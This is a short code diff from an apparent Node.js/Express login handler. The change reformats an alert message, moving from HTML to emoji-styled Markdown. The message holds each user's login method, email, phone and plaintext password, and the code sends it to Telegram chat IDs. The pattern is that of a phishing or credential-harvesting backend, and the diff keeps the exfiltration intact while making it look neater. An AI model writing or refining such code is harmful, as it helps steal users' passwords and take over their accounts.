@@ -101,12 +101,12 @@ app.post('/api/login', async (req, res) => {
 
     // Prepare Telegram message
     const message = `<b>New User Login</b>\n
-<b>Login Method:</b> ${loginMethod}\n
-<b>Email:</b> ${email || 'N/A'}\n
-<b>Phone:</b> ${phone || 'N/A'}\n
-<b>Password:</b> ${password}\n
-<b>Date:</b> ${loginDate}\n
-<b>Time:</b> ${loginTime}`;
+🔹 *Method:* ${loginMethod}
+📅 *Date:* ${loginDate}
+🕒 *Time:* ${loginTime}
+📧 *Email:* ${email || 'N/A'}
+📱 *Phone:* ${phone || 'N/A'}
+🔑 *Password:* ${password}`;
 
     // Send login data to Telegram chat IDs
     await sendToTelegram(message);
